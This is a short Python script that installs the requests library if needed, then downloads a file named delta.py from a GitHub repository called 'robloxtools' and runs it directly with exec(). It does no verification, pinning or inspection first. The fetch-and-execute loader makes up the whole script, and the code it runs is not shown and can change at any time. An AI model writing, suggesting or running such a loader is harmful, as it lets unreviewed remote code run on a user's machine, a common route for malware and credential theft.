import subprocess
import sys

def install_request():
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])

try:
    import requests
except ImportError:
    print("requests module not found. Installing...")
    install_request()
    import requests

file = 'delta.py'
url = f'https://raw.githubusercontent.com/mitbingoo/robloxtools/main/{file}'

try:
    response = requests.get(url)
    response.raise_for_status()
    code = response.text
    
    print(f"Successfully downloaded {file}")
    print("Executing the script...")
    
    exec(code)
except requests.RequestException as e:
    print(f"Error downloading the script: {e}")
except Exception as e:
    print(f"Error executing the script: {e}")